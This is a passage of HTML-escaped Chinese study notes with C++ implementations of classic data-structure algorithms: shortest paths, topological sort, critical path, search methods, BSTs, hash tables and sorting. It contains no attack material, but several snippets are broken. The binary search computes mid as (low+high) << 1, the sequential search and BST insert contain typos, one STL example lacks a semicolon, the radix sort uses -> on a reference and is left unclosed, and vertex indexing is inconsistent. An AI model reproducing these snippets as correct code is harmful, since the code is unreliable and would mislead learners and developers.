LocateVex(G, v1); int j &#x3D; LocateVex(G, v2); if (i !&#x3D; -1 &amp;&amp; j !&#x3D; -1) &#123; G.arcs[i][j] &#x3D; w; &#125; &#125; &#125; void Dijkstra(Graph &amp;G, char start)&#123; int v0 &#x3D; LocateVex(G,start); int n &#x3D; G.vexNum; vector&lt;int&gt; dist(n + 1, INF); vector&lt;bool&gt; visited(n + 1, false); vector&lt;int&gt; path(n + 1, -1); dist[v0] &#x3D; 0; for(int i &#x3D; 1; i &lt;&#x3D; n; i++) &#123; int u &#x3D; -1; int minDist &#x3D; INF; for(int j &#x3D; 1; j &lt;&#x3D; n; j++) &#123; if(!visited[j] &amp;&amp; dist[j] &lt; minDist) &#123; u &#x3D; j; minDist &#x3D; dist[j]; &#125; &#125; if(u &#x3D;&#x3D; -1) break; visited[u] &#x3D; true; for(int v &#x3D; 1; v &lt;&#x3D; n; v++) &#123; if(!visited[v] &amp;&amp; G.arcs[u][v] !&#x3D; INF) &#123; if(dist[u] + G.arcs[u][v] &lt; dist[v]) &#123; dist[v] &#x3D; dist[u] + G.arcs[u][v]; path[v] &#x3D; u; &#x2F;&#x2F; 记录路径 &#125; &#125; &#125; &#125; for(int i &#x3D; 1; i &lt;&#x3D; n; i++) &#123; if(i !&#x3D; v0) &#123; if(dist[i] &#x3D;&#x3D; INF) &#123; cout &lt;&lt; &quot;Invalid.&quot; &lt;&lt; endl; &#125; else &#123; cout &lt;&lt; dist[i] &lt;&lt; endl; cout &lt;&lt; start; vector&lt;int&gt; route; int k &#x3D; i; while(k !&#x3D; -1) &#123; route.push_back(k); k &#x3D; path[k]; &#125; for(int r &#x3D; route.size()-1; r &gt;&#x3D; 0; r--) &#123; cout &lt;&lt; &quot; -&gt; &quot; &lt;&lt; G.vexs[route[r]]; &#125; cout &lt;&lt; endl; &#125; &#125; &#125; &#125; int main() &#123; Graph G; Create(G); char start; cin &gt;&gt; start; Dijkstra(G, start); return 0; &#125; Floyd #include &lt;bits&#x2F;stdc++.h&gt; using namespace std; #define MVNum 100 #define INF 114154 typedef struct &#123; char vexs[MVNum]; int arcs[MVNum][MVNum]; int vexNum, arcNum; &#125; Graph; int LocateVex(const Graph &amp;G, char v) &#123; for (int i &#x3D; 0; i &lt; G.vexNum; ++i) &#123; if (G.vexs[i] &#x3D;&#x3D; v) return i; &#125; return -1; &#125; void Create(Graph &amp;G) &#123; cin &gt;&gt; G.vexNum &gt;&gt; G.arcNum; for (int i &#x3D; 1; i &lt;&#x3D; G.vexNum; i++) &#123; cin &gt;&gt; G.vexs[i]; &#125; for (int i &#x3D; 1; i &lt;&#x3D; G.vexNum; i++) &#123; for(int j&#x3D;1;j&lt;&#x3D;G.vexNum;j++) &#123; G.arcs[i][j]&#x3D;INF; if(i&#x3D;&#x3D;j) &#123; G.arcs[i][j]&#x3D;0; &#125; &#125; &#125; for (int k &#x3D; 1; k &lt;&#x3D; G.arcNum; k++) &#123; char v1, v2; int w; cin &gt;&gt; v1 &gt;&gt; v2 &gt;&gt; w; int i &#x3D; LocateVex(G, v1); int j &#x3D; LocateVex(G, v2); if (i !&#x3D; -1 &amp;&amp; j !&#x3D; -1) &#123; G.arcs[i][j] &#x3D; w; &#125; &#125; &#125; void Floyd(Graph &amp;G) &#123; int n &#x3D; G.vexNum; vector&lt;vector&lt;int&gt;&gt; dist(n + 1, vector&lt;int&gt;(n + 1)); vector&lt;vector&lt;int&gt;&gt; path(n + 1, vector&lt;int&gt;(n + 1, -1)); for(int i &#x3D; 1; i &lt;&#x3D; n; i++) &#123; for(int j &#x3D; 1; j &lt;&#x3D; n; j++) &#123; dist[i][j] &#x3D; G.arcs[i][j]; if(dist[i][j] &lt; INF &amp;&amp; i !&#x3D; j) &#123; path[i][j] &#x3D; i; &#125; &#125; &#125; for(int k &#x3D; 1; k &lt;&#x3D; n; k++) &#123; for(int i &#x3D; 1; i &lt;&#x3D; n; i++) &#123; for(int j &#x3D; 1; j &lt;&#x3D; n; j++) &#123; if(dist[i][k] !&#x3D; INF &amp;&amp; dist[k][j] !&#x3D; INF &amp;&amp; dist[i][k] + dist[k][j] &lt; dist[i][j]) &#123; dist[i][j] &#x3D; dist[i][k] + dist[k][j]; path[i][j] &#x3D; path[k][j]; &#125; &#125; &#125; &#125; for(int i &#x3D; 1; i &lt;&#x3D; n; i++) &#123; for(int j &#x3D; 1; j &lt;&#x3D; n; j++) &#123; if(i !&#x3D; j) &#123; cout &lt;&lt; G.vexs[i] &lt;&lt; &quot; &quot; &lt;&lt; G.vexs[j]; if(dist[i][j] &#x3D;&#x3D; INF) &#123; cout &lt;&lt; &quot;Invalid.&quot; &lt;&lt; endl; &#125; else &#123; cout &lt;&lt; dist[i][j] &lt;&lt; endl; cout &lt;&lt; G.vexs[i]; int k &#x3D; path[i][j]; vector&lt;int&gt; route; while(k !&#x3D; -1) &#123; route.push_back(k); k &#x3D; path[i][k]; &#125; for(int r &#x3D; route.size()-1; r &gt;&#x3D; 0; r--) &#123; cout &lt;&lt; &quot; -&gt; &quot; &lt;&lt; G.vexs[route[r]]; &#125; cout &lt;&lt; &quot; -&gt; &quot; &lt;&lt; G.vexs[j] &lt;&lt; endl; &#125; &#125; &#125; &#125; &#125; int main() &#123; Graph G; Create(G); Floyd(G); return 0; &#125; 拓扑排序 #include &lt;bits&#x2F;stdc++.h&gt; using namespace std; #define MVNum 100 typedef struct &#123; char vexs[MVNum]; int arcs[MVNum][MVNum]; int vexNum, arcNum; &#125; Graph; int LocateVex(const Graph &amp;G, char v) &#123; for (int i &#x3D; 0; i &lt; G.vexNum; ++i) &#123; if (G.vexs[i] &#x3D;&#x3D; v) return i; &#125; return -1; &#125; void CreateGraph(Graph &amp;G) &#123; cin &gt;&gt; G.vexNum &gt;&gt; G.arcNum; for (int i &#x3D; 0; i &lt; G.vexNum; i++) &#123; cin &gt;&gt; G.vexs[i]; &#125; for (int i &#x3D; 0; i &lt; G.vexNum; i++) &#123; for (int j &#x3D; 0; j &lt; G.vexNum; j++) &#123; G.arcs[i][j] &#x3D; 0; &#125; &#125; for (int k &#x3D; 0; k &lt; G.arcNum; k++) &#123; char v1, v2; cin &gt;&gt; v1 &gt;&gt; v2; int i &#x3D; LocateVex(G, v1); int j &#x3D; LocateVex(G, v2); if (i !&#x3D; -1 &amp;&amp; j !&#x3D; -1) &#123; G.arcs[i][j] &#x3D; 1; &#x2F;&#x2F; 有向图 &#125; &#125; &#125; bool TopologicalSort(Graph &amp;G) &#123; vector&lt;int&gt; inDegree(G.vexNum, 0); for (int i &#x3D; 0; i &lt; G.vexNum; i++) &#123; for (int j &#x3D; 0; j &lt; G.vexNum; j++) &#123; if (G.arcs[j][i] &#x3D;&#x3D; 1) &#123; inDegree[i]++; &#125; &#125; &#125; queue&lt;int&gt; q; for (int i &#x3D; 0; i &lt; G.vexNum; i++) &#123; if (inDegree[i] &#x3D;&#x3D; 0) &#123; q.push(i); &#125; &#125; int count &#x3D; 0; vector&lt;char&gt; result; while (!q.empty()) &#123; int v &#x3D; q.front(); q.pop(); result.push_back(G.vexs[v]); count++; for (int i &#x3D; 0; i &lt; G.vexNum; i++) &#123; if (G.arcs[v][i] &#x3D;&#x3D; 1) &#123; inDegree[i]--; if (inDegree[i] &#x3D;&#x3D; 0) &#123; q.push(i); &#125; &#125; &#125; &#125; if (count &#x3D;&#x3D; G.vexNum) &#123; for (char c : result) &#123; cout &lt;&lt; c &lt;&lt; &quot; &quot;; &#125; cout &lt;&lt; endl; return true; &#125; else &#123; return false; &#125; &#125; int main() &#123; Graph G; CreateGraph(G); TopologicalSort(G); return 0; &#125; 关键路径 #include &lt;bits&#x2F;stdc++.h&gt; using namespace std; #define MVNum 100 #define INF 114154 typedef struct &#123; char vexs[MVNum]; int arcs[MVNum][MVNum]; int vexNum, arcNum; &#125; Graph; int LocateVex(const Graph &amp;G, char v) &#123; for (int i &#x3D; 0; i &lt; G.vexNum; ++i) &#123; if (G.vexs[i] &#x3D;&#x3D; v) return i; &#125; return -1; &#125; void CreateGraph(Graph &amp;G) &#123; cin &gt;&gt; G.vexNum &gt;&gt; G.arcNum; for (int i &#x3D; 0; i &lt; G.vexNum; i++) &#123; cin &gt;&gt; G.vexs[i]; &#125; for (int i &#x3D; 0; i &lt; G.vexNum; i++) &#123; for (int j &#x3D; 0; j &lt; G.vexNum; j++) &#123; G.arcs[i][j] &#x3D; 0; &#125; &#125; for (int k &#x3D; 0; k &lt; G.arcNum; k++) &#123; char v1, v2; int w; cin &gt;&gt; v1 &gt;&gt; v2 &gt;&gt; w; int i &#x3D; LocateVex(G, v1); int j &#x3D; LocateVex(G, v2); if (i !&#x3D; -1 &amp;&amp; j !&#x3D; -1) &#123; G.arcs[i][j] &#x3D; w; &#125; &#125; &#125; bool TopologicalSort(Graph &amp;G, vector&lt;int&gt; &amp;topoOrder) &#123; vector&lt;int&gt; inDegree(G.vexNum, 0); for (int i &#x3D; 0; i &lt; G.vexNum; i++) &#123; for (int j &#x3D; 0; j &lt; G.vexNum; j++) &#123; if (G.arcs[j][i] !&#x3D; 0) &#123; inDegree[i]++; &#125; &#125; &#125; queue&lt;int&gt; q; for (int i &#x3D; 0; i &lt; G.vexNum; i++) &#123; if (inDegree[i] &#x3D;&#x3D; 0) &#123; q.push(i); &#125; &#125; while (!q.empty()) &#123; int v &#x3D; q.front(); q.pop(); topoOrder.push_back(v); for (int i &#x3D; 0; i &lt; G.vexNum; i++) &#123; if (G.arcs[v][i] !&#x3D; 0) &#123; inDegree[i]--; if (inDegree[i] &#x3D;&#x3D; 0) &#123; q.push(i); &#125; &#125; &#125; &#125; return topoOrder.size() &#x3D;&#x3D; G.vexNum; &#125; void CalculateVE(Graph &amp;G, const vector&lt;int&gt; &amp;topoOrder, vector&lt;int&gt; &amp;ve) &#123; &#x2F;&#x2F; 初始化ve数组 ve.resize(G.vexNum, 0); &#x2F;&#x2F; 按拓扑顺序计算ve for (int i &#x3D; 0; i &lt; topoOrder.size(); i++) &#123; int u &#x3D; topoOrder[i]; for (int v &#x3D; 0; v &lt; G.vexNum; v++) &#123; if (G.arcs[u][v] !&#x3D; 0) &#123; ve[v] &#x3D; max(ve[v], ve[u] + G.arcs[u][v]); &#125; &#125; &#125; &#125; void CalculateVL(Graph &amp;G, const vector&lt;int&gt; &amp;topoOrder, const vector&lt;int&gt; &amp;ve, vector&lt;int&gt; &amp;vl) &#123; &#x2F;&#x2F; 初始化vl数组 vl.resize(G.vexNum, ve[topoOrder.back()]); &#x2F;&#x2F; 按逆拓扑顺序计算vl for (int i &#x3D; topoOrder.size() - 1; i &gt;&#x3D; 0; i--) &#123; int u &#x3D; topoOrder[i]; for (int v &#x3D; 0; v &lt; G.vexNum; v++) &#123; if (G.arcs[u][v] !&#x3D; 0) &#123; vl[u] &#x3D; min(vl[u], vl[v] - G.arcs[u][v]); &#125; &#125; &#125; &#125; void FindCriticalPath(Graph &amp;G, const vector&lt;int&gt; &amp;ve, const vector&lt;int&gt; &amp;vl) &#123; for (int i &#x3D; 0; i &lt; G.vexNum; i++) &#123; for (int j &#x3D; 0; j &lt; G.vexNum; j++) &#123; if (G.arcs[i][j] !&#x3D; 0) &#123; int e &#x3D; ve[i]; &#x2F;&#x2F; 活动最早开始时间 int l &#x3D; vl[j] - G.arcs[i][j]; &#x2F;&#x2F; 活动最晚开始时间 if (e &#x3D;&#x3D; l) &#123; &#x2F;&#x2F; 关键活动 cout &lt;&lt; G.vexs[i] &lt;&lt; &quot; &quot; &lt;&lt; G.vexs[j] &lt;&lt; &quot; &quot; &lt;&lt; G.arcs[i][j] &lt;&lt; endl; &#125; &#125; &#125; &#125; &#125; int main() &#123; Graph G; CreateGraph(G); vector&lt;int&gt; topoOrder; if (!TopologicalSort(G, topoOrder)) &#123; cout &lt;&lt; &quot;ERROR&quot; &lt;&lt; endl; return 0; &#125; vector&lt;int&gt; ve, vl; CalculateVE(G, topoOrder, ve); CalculateVL(G, topoOrder, ve, vl); FindCriticalPath(G, ve, vl); return 0; &#125; 查找 线性表 顺序查找 typedef struct&#123; KeyType key; InfoType otherinfo; &#125;ElemType; typedef struct&#123; ElemType *R; int length; &#125;SSTable; int Search_Seq(SSTable ST,KeyType key)&#123; for(int i&#x3D;ST.length;i&gt;&#x3D;1;i--)&#123; if(ST.R[i],key&#x3D;&#x3D;key)&#123; return i; &#125; &#125; return 0; &#125; 二分查找 typedef struct&#123; KeyType key; InfoType otherinfo; &#125;ElemType; typedef struct&#123; ElemType *R; int length; &#125;SSTable; int Search_Bin(SSTable ST,KeyType key)&#123; int low &#x3D; 1; int high &#x3D; ST.length; while(low&lt;&#x3D;high)&#123; int mid &#x3D; (low+high) &lt;&lt; 1; if(key&#x3D;&#x3D;ST.R[mid].key)&#123; return mid; &#125; else if(key&lt;ST.R[mid].key)&#123; high &#x3D; mid - 1; &#125; else&#123; low &#x3D; mid + 1; &#125; &#125; return 0; &#125; 分块查找 typedef struct&#123; KeyType key; InfoType otherinfo; &#125;ElemType; typedef struct&#123; ElemType *R; int length; &#125;SSTable; typedef struct &#123; KeyType max_key; &#x2F;&#x2F; 块内最大关键字 int start; &#x2F;&#x2F; 块起始位置 int end; &#x2F;&#x2F; 块结束位置 &#125; IndexBlock; int BlockSearch(SSTable ST, IndexBlock index[], int index_len, KeyType key) &#123; int low &#x3D; 0, high &#x3D; index_len - 1; int block_idx &#x3D; -1; &#x2F;&#x2F; 二分查找确定所在块 while (low &lt;&#x3D; high) &#123; int mid &#x3D; (low + high) &#x2F; 2; if (key &lt;&#x3D; index[mid].max_key) &#123; block_idx &#x3D; mid; high &#x3D; mid - 1; &#125; else &#123; low &#x3D; mid + 1; &#125; &#125; if (block_idx &#x3D;&#x3D; -1) return -1; &#x2F;&#x2F; 在块内顺序查找 for (int i &#x3D; index[block_idx].start; i &lt;&#x3D; index[block_idx].end; ++i) &#123; if (ST.R[i].key &#x3D;&#x3D; key) return i; &#125; return -1; &#125; 树表 二叉排序树 typedef struct&#123; KeyType key; InfoType otherinfo; &#125;ElemType; typedef struct BSTNode&#123; ElemType data; struct BSTNode *lchild,*rchild; &#125;BSTNode,*BSTree; BSTree SearchBST(BSTree T,KeyType key)&#123; if(!T || key&#x3D;&#x3D;T-&gt;data.key)&#123; return T; &#125; else if(key&lt;T-&gt;data.key)&#123; return SearchBST(T-&gt;lchild,key); &#125; else&#123; return SearchBST(T-&gt;rchild,key); &#125; &#125; void InsertBST(BSTree &amp;T,ElemType e)&#123; if(!T)&#123; BSTNode S &#x3D; new BSTNode; S-&gt;data &#x3D; e; S-&gt;lchild &#x3D; NULL; S-&gt;rchild &#x3D; NULL; T &#x3D; S; &#125; else if(e.key&lt;T-&gt;data.key)&#123; InsertBST(T-&gt;lchild,e); &#125; else if(e.key&gt;T-&gt;data.key)&#123; InsertBST(T-&gt;rchild,e); &#125; &#125; void CreateBST(BSTree &amp;T)&#123; int e; T &#x3D; NULL; cin &gt;&gt; e; while(e.key!&#x3D;-1)&#123; InsertBST(T,e); cin &gt;&gt; e; &#125; &#125; void DeleteBST(BSTree &amp;T, KeyType key) &#123; BSTree p &#x3D; T; &#x2F;&#x2F; 当前节点指针 BSTree f &#x3D; NULL; &#x2F;&#x2F; 父节点指针 &#x2F;&#x2F; 查找删除节点 while (p) &#123; if (p-&gt;data.key &#x3D;&#x3D; key) break; f &#x3D; p; if (p-&gt;data.key &gt; key) p &#x3D; p-&gt;lchild; else p &#x3D; p-&gt;rchild; &#125; if (!p) return; BSTree q &#x3D; p; &#x2F;&#x2F; 辅助指针 q 指向待删除节点 &#x2F;&#x2F; Case 1: 节点 p 是叶子节点或仅有一个子树 if (!p-&gt;lchild) &#123; &#x2F;&#x2F; 左子树为空，用右子树替换 if (!f) T &#x3D; p-&gt;rchild; &#x2F;&#x2F; p 是根节点 else if (f-&gt;lchild &#x3D;&#x3D; p) f-&gt;lchild &#x3D; p-&gt;rchild; else f-&gt;rchild &#x3D; p-&gt;rchild; free(q); &#125; else if (!p-&gt;rchild) &#123; &#x2F;&#x2F; 右子树为空，用左子树替换 if (!f) T &#x3D; p-&gt;lchild; &#x2F;&#x2F; p 是根节点 else if (f-&gt;lchild &#x3D;&#x3D; p) f-&gt;lchild &#x3D; p-&gt;lchild; else f-&gt;rchild &#x3D; p-&gt;lchild; free(q); &#125; else &#123; &#x2F;&#x2F; Case 2: 节点 p 有两个子树，找左子树的最右节点（前驱） BSTree s &#x3D; p-&gt;lchild; BSTree parent_s &#x3D; p; &#x2F;&#x2F; s 的父节点 while (s-&gt;rchild) &#123; parent_s &#x3D; s; s &#x3D; s-&gt;rchild; &#125; &#x2F;&#x2F; 用前驱 s 替换 p 的值 p-&gt;data &#x3D; s-&gt;data; &#x2F;&#x2F; 删除前驱节点 s（此时 s 至多有一个左子树） if (parent_s &#x3D;&#x3D; p) parent_s-&gt;lchild &#x3D; s-&gt;lchild; else parent_s-&gt;rchild &#x3D; s-&gt;lchild; free(s); &#125; &#125; 哈希表 #include &lt;iostream&gt; #include &lt;vector&gt; #include &lt;list&gt; #include &lt;string&gt; using namespace std; &#x2F;&#x2F; 拉链法 static const int tableSize &#x3D; 10; vector&lt;list&lt;pair&lt;int, string&gt;&gt;&gt; chainTable(tableSize); int hashFunction(int key) &#123; return key % tableSize; &#125; void insertChaining(int key, string value) &#123; int index &#x3D; hashFunction(key); chainTable[index].push_back(make_pair(key, value)); &#125; string searchChaining(int key) &#123; int index &#x3D; hashFunction(key); for (auto &amp;p : chainTable[index]) &#123; if (p.first &#x3D;&#x3D; key) return p.second; &#125; return &quot;&quot;; &#125; void removeChaining(int key) &#123; int index &#x3D; hashFunction(key); auto &amp;chain &#x3D; chainTable[index]; for (auto it &#x3D; chain.begin(); it !&#x3D; chain.end(); ++it) &#123; if (it-&gt;first &#x3D;&#x3D; key) &#123; chain.erase(it); return; &#125; &#125; &#125; &#x2F;&#x2F; 开放定址法（以线性探测为例） enum EntryState &#123; EMPTY, OCCUPIED, DELETED &#125;; struct HashEntry &#123; int key; string value; EntryState state; &#125;; vector&lt;HashEntry&gt; openTable(tableSize, &#123;0, &quot;&quot;, EMPTY&#125;); int hashFunctionLP(int key) &#123; return key % tableSize; &#125; void insertLinear(int key, string value) &#123; int idx &#x3D; hashFunctionLP(key); for (int i &#x3D; 0; i &lt; tableSize; ++i) &#123; int probe &#x3D; (idx + i) % tableSize; if (openTable[probe].state &#x3D;&#x3D; EMPTY || openTable[probe].state &#x3D;&#x3D; DELETED) &#123; openTable[probe].key &#x3D; key; openTable[probe].value &#x3D; value; openTable[probe].state &#x3D; OCCUPIED; return; &#125; &#125; &#125; string searchLinear(int key) &#123; int idx &#x3D; hashFunctionLP(key); for (int i &#x3D; 0; i &lt; tableSize; ++i) &#123; int probe &#x3D; (idx + i) % tableSize; if (openTable[probe].state &#x3D;&#x3D; EMPTY) return &quot;&quot;; if (openTable[probe].state &#x3D;&#x3D; OCCUPIED &amp;&amp; openTable[probe].key &#x3D;&#x3D; key) return openTable[probe].value; &#125; return &quot;&quot;; &#125; void removeLinear(int key) &#123; int idx &#x3D; hashFunctionLP(key); for (int i &#x3D; 0; i &lt; tableSize; ++i) &#123; int probe &#x3D; (idx + i) % tableSize; if (openTable[probe].state &#x3D;&#x3D; EMPTY) return; if (openTable[probe].state &#x3D;&#x3D; OCCUPIED &amp;&amp; openTable[probe].key &#x3D;&#x3D; key) &#123; openTable[probe].state &#x3D; DELETED; return; &#125; &#125; &#125; STL unordered_set insert(x) 向集合中插入元素 x（若已存在，则不插入） erase(x) 从集合中删除元素 x find(x) 查找元素 x，返回迭代器；若未找到，返回 end() count(x) 统计元素 x 在集合中出现的次数（要么 0，要么 1） size() 查询集合中元素数量 empty() 判断集合是否为空 clear() 清空集合中的所有元素 #include &lt;iostream&gt; #include &lt;unordered_set&gt; using namespace std; int main()&#123; unordered_set&lt;int&gt; us; us.insert(3); us.insert(1); us.insert(4) us.insert(1); cout &lt;&lt; us.size() &lt;&lt; endl; cout &lt;&lt; (us.find(2) !&#x3D; us.end()) &lt;&lt; endl; cout &lt;&lt; us.count(1) &lt;&lt; endl; us.erase(3); us.clear(); cout &lt;&lt; us.empty() &lt;&lt; endl; &#125; unordered_map insert({k, v}) 向映射中插入键值对 (k, v)（若键已存在，不插入） erase(k) 删除键为 k 的元素 find(k) 查找键为 k 的元素，返回指向该元素的迭代器；若未找到，返回 end() count(k) 统计键 k 在映射中出现的次数（要么 0，要么 1） operator[](k) 如果键 k 存在，返回对应的值；否则插入一个键为 k、值为默认构造的元素并返回其引用 size() 查询映射中元素数量 empty() 判断映射是否为空 clear() 清空映射中的所有元素 #include &lt;iostream&gt; #include &lt;unordered_map&gt; using namespace std; int main()&#123; unordered_map&lt;string, int&gt; um; um.insert(&#123;&quot;apple&quot;, 3&#125;); um.insert(make_pair(&quot;banana&quot;, 5)); um[&quot;cherry&quot;] &#x3D; 2; cout &lt;&lt; um.size() &lt;&lt; endl; cout &lt;&lt; um[&quot;cherry&quot;] &lt;&lt; endl; auto it &#x3D; um.find(&quot;banana&quot;); if (it !&#x3D; um.end()) &#123; cout &lt;&lt; it-&gt;second &lt;&lt; endl; &#125; um.erase(&quot;apple&quot;); um.clear(); cout &lt;&lt; um.empty() &lt;&lt; endl; &#125; 排序 插入排序 #include &lt;iostream&gt; using namespace std; typedef struct &#123; int *r; int length; &#125; SqList; void InsertSort(SqList &amp;L) &#123; for (int i &#x3D; 1; i &lt; L.length; i++) &#123; int temp &#x3D; L.r[i]; int j &#x3D; i - 1; while (j &gt;&#x3D; 0 &amp;&amp; L.r[j] &gt; temp) &#123; L.r[j + 1] &#x3D; L.r[j]; j--; &#125; L.r[j + 1] &#x3D; temp; &#125; &#125; &#x2F;&#x2F; 二分查找插入位置 void BinaryInsertSort(SqList &amp;L) &#123; for (int i &#x3D; 1; i &lt; L.length; i++) &#123; int temp &#x3D; L.r[i]; int start &#x3D; 0; int end &#x3D; i - 1; while (start &lt;&#x3D; end) &#123; int mid &#x3D; (start + end) &#x2F; 2; if (L.r[mid] &gt; temp) &#123; end &#x3D; mid - 1; &#125; else &#123; start &#x3D; mid + 1; &#125; &#125; for (int j &#x3D; i - 1; j &gt;&#x3D; start; j--) &#123; L.r[j + 1] &#x3D; L.r[j]; &#125; L.r[start] &#x3D; temp; &#125; &#125; 希尔排序 #include &lt;iostream&gt; using namespace std; #define MAXSIZE 100 typedef struct &#123; int data[MAXSIZE]; int length; &#125; Sqlist; void ShellSort(Sqlist &amp;L) &#123; &#x2F;&#x2F; 初始间隔（gap）为长度的一半，逐步缩小间隔直到1 for (int gap &#x3D; L.length &#x2F; 2; gap &gt; 0; gap &#x2F;&#x3D; 2) &#123; &#x2F;&#x2F; 对每个子序列进行插入排序 for (int i &#x3D; gap; i &lt; L.length; i++) &#123; int temp &#x3D; L.data[i]; int j; for (j &#x3D; i; j &gt;&#x3D; gap &amp;&amp; L.data[j - gap] &gt; temp; j -&#x3D; gap) &#123; L.data[j] &#x3D; L.data[j - gap]; &#125; L.data[j] &#x3D; temp; &#125; &#125; &#125; 冒泡排序 #include &lt;iostream&gt; using namespace std; #define MAXSIZE 100 typedef struct &#123; int data[MAXSIZE]; int length; &#125; Sqlist; void bubble(Sqlist &amp;L) &#123; for (int i &#x3D; L.length - 1; i &gt; 0; i--) &#123; for (int j &#x3D; 0; j &lt; i; j++) &#123; if (L.data[j] &gt; L.data[j + 1]) &#123; swap(L.data[j], L.data[j + 1]); &#125; &#125; &#125; &#125; 快速排序 #include &lt;iostream&gt; using namespace std; void QuickSort(int a[], int m, int n) &#123; if (m &gt;&#x3D; n) return; int low &#x3D; m; int high &#x3D; n; int pivot &#x3D; a[(m + n) &#x2F; 2]; while (low &lt;&#x3D; high) &#123; while (a[low] &lt; pivot) low++; while (a[high] &gt; pivot) high--; if (low &lt;&#x3D; high) &#123; swap(a[low], a[high]); low++; high--; &#125; &#125; QuickSort(a, m, high); QuickSort(a, low, n); &#125; 选择排序 #include &lt;iostream&gt; using namespace std; #define MAXSIZE 100 typedef struct &#123; int data[MAXSIZE]; int length; &#125; Sqlist; void Select(Sqlist &amp;L) &#123; for (int i &#x3D; 0; i &lt; L.length - 1; i++) &#123; int k &#x3D; i; for (int j &#x3D; i + 1; j &lt; L.length; j++) &#123; if (L.data[j] &lt; L.data[k]) &#123; k &#x3D; j; &#125; &#125; if (k !&#x3D; i) &#123; swap(L.data[i], L.data[k]); &#125; &#125; &#125; 堆排序 #include &lt;iostream&gt; using namespace std; #define MAXSIZE 100 typedef struct &#123; int data[MAXSIZE]; int length; &#125; Sqlist; void HeapAdjust(Sqlist &amp;L, int s, int m) &#x2F;&#x2F; s: 待调整的子树根节点下标 m：最后一个元素的下标（调整范围上限） &#123; int rc &#x3D; L.data[s]; &#x2F;&#x2F; 沿关键字较大的子节点向下筛选 for (int j &#x3D; 2 * s + 1; j &lt;&#x3D; m; j &#x3D; 2 * j + 1) &#x2F;&#x2F; 完全二叉树 左孩子下标2k+1 &#123; &#x2F;&#x2F; 比较左右孩子，j指向较大的孩子 if (j &lt; m &amp;&amp; L.data[j] &lt; L.data[j + 1]) j &#x3D; j + 1; &#x2F;&#x2F; 右孩子更大，j指向右孩子 &#x2F;&#x2F; 若根节点已比最大孩子大，则调整完成 if (rc &gt;&#x3D; L.data[j]) break; L.data[s] &#x3D; L.data[j]; &#x2F;&#x2F; 将较大孩子值上移 s &#x3D; j; &#x2F;&#x2F; s指向下一层待比较位置 &#125; L.data[s] &#x3D; rc; &#x2F;&#x2F; 将最初根节点值放入最终位置 &#125; void CreateHeap(Sqlist &amp;L) &#123; &#x2F;&#x2F; 从最后一个非叶子节点开始向前调整 for (int i &#x3D; L.length &#x2F; 2 - 1; i &gt;&#x3D; 0; i--) &#123; HeapAdjust(L, i, L.length - 1); &#x2F;&#x2F; 调整以i为根的子树 &#125; &#125; void HeapSort(Sqlist &amp;L) &#123; CreateHeap(L); for (int i &#x3D; L.length - 1; i &gt; 0; i--) &#123; swap(L.data[0], L.data[i]); &#x2F;&#x2F; 堆顶最大值交换到末尾 HeapAdjust(L, 0, i - 1); &#x2F;&#x2F; 调整剩余元素为新堆 &#125; &#125; 归并排序 #include &lt;iostream&gt; using namespace std; #define MAXSIZE 100 typedef struct &#123; int data[MAXSIZE]; int length; &#125; Sqlist; void Merge(Sqlist &amp;L, int low, int mid, int high) &#123; int *temp &#x3D; new int[high - low + 1]; int i &#x3D; low; &#x2F;&#x2F; 左半部分起始索引 int j &#x3D; mid + 1; &#x2F;&#x2F; 右半部分起始索引 int k &#x3D; 0; &#x2F;&#x2F; 临时数组索引 &#x2F;&#x2F; 合并元素到临时数组 while (i &lt;&#x3D; mid &amp;&amp; j &lt;&#x3D; high) &#123; if (L.data[i] &lt;&#x3D; L.data[j]) temp[k++] &#x3D; L.data[i++]; else temp[k++] &#x3D; L.data[j++]; &#125; &#x2F;&#x2F; 处理剩余元素 while (i &lt;&#x3D; mid) temp[k++] &#x3D; L.data[i++]; while (j &lt;&#x3D; high) temp[k++] &#x3D; L.data[j++]; &#x2F;&#x2F; 将排序好的数据拷贝回原数组 for (i &#x3D; low, k &#x3D; 0; i &lt;&#x3D; high; i++, k++) L.data[i] &#x3D; temp[k]; delete[] temp; &#x2F;&#x2F; 释放临时数组 &#125; &#x2F;&#x2F; 递归分治函数 void MSort(Sqlist &amp;L, int low, int high) &#123; if (low &lt; high) &#123; int mid &#x3D; (low + high) &#x2F; 2; &#x2F;&#x2F; 计算中间位置 MSort(L, low, mid); &#x2F;&#x2F; 递归左半部分 MSort(L, mid + 1, high); &#x2F;&#x2F; 递归右半部分 Merge(L, low, mid, high); &#x2F;&#x2F; 合并已排序部分 &#125; &#125; &#x2F;&#x2F; 归并排序入口函数 void MergeSort(Sqlist &amp;L) &#123; if (L.length &lt;&#x3D; 0) return; MSort(L, 0, L.length - 1); &#x2F;&#x2F; 调用递归排序 &#125; 基数排序 #include &lt;iostream&gt; using namespace std; #define MAXSIZE 100 typedef struct &#123; int data[MAXSIZE]; int length; &#125; Sqlist; &#x2F;&#x2F; 以位数比较为例 void RadixSort(Sqlist &amp;L) &#123; if (L-&gt;length &lt;&#x3D; 1) return; int max_num &#x3D; L-&gt;data[0]; for (int i &#x3D; 1; i &lt; L-&gt;length; ++i) &#123; if (L-&gt;data[i] &gt; max_num) max_num &#x3D; L-&gt;data[i]; &#125; for (int exp &#x3D; 1; max_num &#x2F; exp &gt; 0; exp *&#x3D; 10) &#123; int count[10] &#x3D; &#123;0&#125;; int output[MAXSIZE]; for (int i &#x3D; 0; i &lt; L-&gt;length; ++i) &#123; int digit &#x3D; (L-&gt;data[i] &#x2F; exp) % 10; count[digit]++; &#125; for (int j &#x3D; 1; j &lt; 10; ++j) &#123; count[j] +&#x3D; count[j - 1]; &#125; for (int i &#x3D; L-&gt;length - 1; i &gt;&#x3D; 0; --i) &#123; int digit &#x3D; (L-&gt;data[i] &#x2F; exp) % 10; output[count[digit] - 1] &#x3D; L-&gt;data[i]; count[digit]--; &#125; for (int i &#x3D; 0; i &lt; L-&gt;length; ++i) &#123; L-&gt;data[i] &#x3D; output[i]; &#125; &#125; 